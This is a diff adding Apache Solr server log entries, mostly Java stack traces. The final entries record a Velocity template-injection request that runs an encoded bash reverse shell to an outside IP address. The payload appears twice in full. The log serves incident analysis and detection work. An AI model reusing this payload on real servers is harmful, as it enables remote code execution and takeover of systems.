+	at org.apache.solr.servlet.HttpSolrCall.call(HttpSolrCall.java:535)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:378)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:322)
+	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1691)
+	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:582)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143)
+	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:548)
+	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:226)
+	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1180)
+	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:512)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:185)
+	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1112)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:213)
+	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:119)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.rewrite.handler.RewriteHandler.handle(RewriteHandler.java:335)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.server.Server.handle(Server.java:534)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:320)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:251)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:273)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:95)
+	at org.eclipse.jetty.io.SelectChannelEndPoint$2.run(SelectChannelEndPoint.java:93)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.executeProduceConsume(ExecuteProduceConsume.java:303)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.produceConsume(ExecuteProduceConsume.java:148)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.run(ExecuteProduceConsume.java:136)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:671)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:589)
+	at java.lang.Thread.run(Thread.java:748)
+Caused by: java.lang.IllegalArgumentException
+	at java.lang.Character.toChars(Character.java:5190)
+	at sun.reflect.GeneratedMethodAccessor18.invoke(Unknown Source)
+	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+	at java.lang.reflect.Method.invoke(Method.java:498)
+	at org.apache.velocity.util.introspection.UberspectImpl$VelMethodImpl.doInvoke(UberspectImpl.java:395)
+	at org.apache.velocity.util.introspection.UberspectImpl$VelMethodImpl.invoke(UberspectImpl.java:384)
+	at org.apache.velocity.runtime.parser.node.ASTMethod.execute(ASTMethod.java:173)
+	... 44 more
+
+2020-03-26 05:13:15.291 ERROR (qtp12209492-13) [   x:te1] o.a.s.s.HttpSolrCall null:org.apache.velocity.exception.MethodInvocationException: Invocation of method 'toChars' in  class java.lang.Class threw exception java.lang.IllegalArgumentException at custom.vm[line 1, column 415]
+	at org.apache.velocity.runtime.parser.node.ASTMethod.handleInvocationException(ASTMethod.java:243)
+	at org.apache.velocity.runtime.parser.node.ASTMethod.execute(ASTMethod.java:187)
+	at org.apache.velocity.runtime.parser.node.ASTReference.execute(ASTReference.java:280)
+	at org.apache.velocity.runtime.parser.node.ASTReference.value(ASTReference.java:567)
+	at org.apache.velocity.runtime.parser.node.ASTMethod.execute(ASTMethod.java:151)
+	at org.apache.velocity.runtime.parser.node.ASTReference.execute(ASTReference.java:280)
+	at org.apache.velocity.runtime.parser.node.ASTReference.render(ASTReference.java:369)
+	at org.apache.velocity.runtime.parser.node.ASTBlock.render(ASTBlock.java:72)
+	at org.apache.velocity.runtime.directive.Foreach.render(Foreach.java:420)
+	at org.apache.velocity.runtime.parser.node.ASTDirective.render(ASTDirective.java:207)
+	at org.apache.velocity.runtime.parser.node.SimpleNode.render(SimpleNode.java:342)
+	at org.apache.velocity.Template.merge(Template.java:356)
+	at org.apache.velocity.Template.merge(Template.java:260)
+	at org.apache.solr.response.VelocityResponseWriter.write(VelocityResponseWriter.java:169)
+	at org.apache.solr.response.QueryResponseWriterUtil.writeQueryResponse(QueryResponseWriterUtil.java:65)
+	at org.apache.solr.servlet.HttpSolrCall.writeResponse(HttpSolrCall.java:806)
+	at org.apache.solr.servlet.HttpSolrCall.call(HttpSolrCall.java:535)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:378)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:322)
+	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1691)
+	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:582)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143)
+	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:548)
+	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:226)
+	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1180)
+	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:512)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:185)
+	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1112)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:213)
+	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:119)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.rewrite.handler.RewriteHandler.handle(RewriteHandler.java:335)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.server.Server.handle(Server.java:534)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:320)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:251)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:273)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:95)
+	at org.eclipse.jetty.io.SelectChannelEndPoint$2.run(SelectChannelEndPoint.java:93)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.executeProduceConsume(ExecuteProduceConsume.java:303)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.produceConsume(ExecuteProduceConsume.java:148)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.run(ExecuteProduceConsume.java:136)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:671)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:589)
+	at java.lang.Thread.run(Thread.java:748)
+Caused by: java.lang.IllegalArgumentException
+	at java.lang.Character.toChars(Character.java:5190)
+	at sun.reflect.GeneratedMethodAccessor18.invoke(Unknown Source)
+	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+	at java.lang.reflect.Method.invoke(Method.java:498)
+	at org.apache.velocity.util.introspection.UberspectImpl$VelMethodImpl.doInvoke(UberspectImpl.java:395)
+	at org.apache.velocity.util.introspection.UberspectImpl$VelMethodImpl.invoke(UberspectImpl.java:384)
+	at org.apache.velocity.runtime.parser.node.ASTMethod.execute(ASTMethod.java:173)
+	... 44 more
+
+2020-03-26 05:13:53.284 ERROR (qtp12209492-16) [   x:te1] o.a.s.h.RequestHandlerBase org.apache.solr.common.SolrException: Bad contentType for search handler :null request={q=1&v.template=custom&v.template.custom=#set($x%3D'')+#set($rt%3D$x.class.forName('java.lang.Runtime'))+#set($chr%3D$x.class.forName('java.lang.Character'))+#set($str%3D$x.class.forName('java.lang.String'))+#set($ex%3D$rt.getRuntime().exec('bash+-c+{echo,YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMzkuMTU1LjEuNjQvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}'))+$ex.waitFor()+#set($out%3D$ex.getInputStream())+#foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end&wt=velocity}
+	at org.apache.solr.request.json.RequestUtil.processParams(RequestUtil.java:73)
+	at org.apache.solr.util.SolrPluginUtils.setDefaults(SolrPluginUtils.java:167)
+	at org.apache.solr.handler.RequestHandlerBase.handleRequest(RequestHandlerBase.java:174)
+	at org.apache.solr.core.SolrCore.execute(SolrCore.java:2474)
+	at org.apache.solr.servlet.HttpSolrCall.execute(HttpSolrCall.java:720)
+	at org.apache.solr.servlet.HttpSolrCall.call(HttpSolrCall.java:526)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:378)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:322)
+	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1691)
+	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:582)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143)
+	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:548)
+	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:226)
+	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1180)
+	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:512)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:185)
+	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1112)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:213)
+	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:119)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.rewrite.handler.RewriteHandler.handle(RewriteHandler.java:335)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.server.Server.handle(Server.java:534)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:320)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:251)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:273)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:95)
+	at org.eclipse.jetty.io.SelectChannelEndPoint$2.run(SelectChannelEndPoint.java:93)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.executeProduceConsume(ExecuteProduceConsume.java:303)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.produceConsume(ExecuteProduceConsume.java:148)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.run(ExecuteProduceConsume.java:136)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:671)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:589)
+	at java.lang.Thread.run(Thread.java:748)
+
+2020-03-26 05:13:53.284 INFO  (qtp12209492-16) [   x:te1] o.a.s.c.S.Request [te1]  webapp=/solr path=/select params={q=1&v.template=custom&v.template.custom=#set($x%3D'')+#set($rt%3D$x.class.forName('java.lang.Runtime'))+#set($chr%3D$x.class.forName('java.lang.Character'))+#set($str%3D$x.class.forName('java.lang.String'))+#set($ex%3D$rt.getRuntime().exec('bash+-c+{echo,YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMzkuMTU1LjEuNjQvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}'))+$ex.waitFor()+#set($out%3D$ex.getInputStream())+#foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end&wt=velocity} status=400 QTime=16
